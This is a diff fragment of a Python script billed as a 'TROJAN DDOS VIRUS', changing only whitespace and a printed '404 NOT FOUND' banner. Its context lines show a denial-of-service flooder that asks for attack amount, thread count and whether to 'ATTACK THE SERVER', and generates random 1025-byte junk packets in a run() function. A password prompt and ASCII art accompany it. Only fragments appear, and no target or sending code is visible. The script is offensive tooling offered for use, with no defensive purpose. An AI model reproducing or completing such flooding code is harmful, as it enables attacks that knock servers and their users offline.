@@ -75,7 +75,7 @@ WELCOME TO TROJAN DDOS VIRUS BY NATHAN ...
     times = int(input("◈ AMOUNT THE VIRUS :"))
     threads = int(input("◈ MANNY THE VIRUS :"))
     choice = str(input("◈ ATTACK THE SERVER ? (y or n):")) 
-   
+
     def run():
         data = random._urandom(1025)
         i = random.choice(("TROJAN : ","TROJAN : "))
@@ -114,7 +114,7 @@ else :
     print("INCORRECT PASSWORD PLEASE CHECK THE WEB *_*")
 
 print("
-404 NOT FOUND
+NOT FOUND
 
 ███████▀▀▀░░░░░░░▀▀▀███████
 ██████▀░░░░░░░░░░░░░░░▀████
